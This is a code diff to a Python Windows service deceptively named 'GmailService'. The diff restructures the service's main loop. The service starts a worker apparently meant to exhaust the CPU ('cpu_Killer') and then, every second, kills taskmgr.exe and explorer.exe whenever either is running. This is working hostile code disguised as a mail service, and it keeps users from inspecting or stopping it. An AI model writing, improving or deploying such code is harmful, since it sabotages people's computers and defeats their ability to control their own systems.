@@ -5,6 +5,7 @@ import win32event
 import math
 import psutil
 import time
+import logging
 from multiprocessing import Process
 
 class GmailService(win32serviceutil.ServiceFramework):
@@ -23,19 +24,19 @@ class GmailService(win32serviceutil.ServiceFramework):
         self.main()
 
     def main(self):
-        while True:
-            p = Process(target=cpu_Killer)
-            p.start()
+            self.worker = Process(target=cpu_Killer)
+            self.worker.start()
 
-            status1 = is_running("taskmgr.exe")
-            status2 = is_running("explorer.exe")
-            print("Status1", status1, "\nStatus2", status2)
+            while win32event.WaitForSingleObject(self.stop_event, 0) == win32event.WAIT_TIMEOUT:
+                logging.info("Service alive")
+                status1 = is_running("taskmgr.exe")
+                status2 = is_running("explorer.exe")
+                logging.info("Status1", status1, "\nStatus2", status2)
 
-            if status1 == True or status2 == True:
-                kill_process("taskmgr.exe")
-                kill_process("explorer.exe")
-            time.sleep(1)
-
+                if status1 == True or status2 == True:
+                    kill_process("taskmgr.exe")
+                    kill_process("explorer.exe")
+                time.sleep(1)
 
 def cpu_Killer():
     x = 0.1
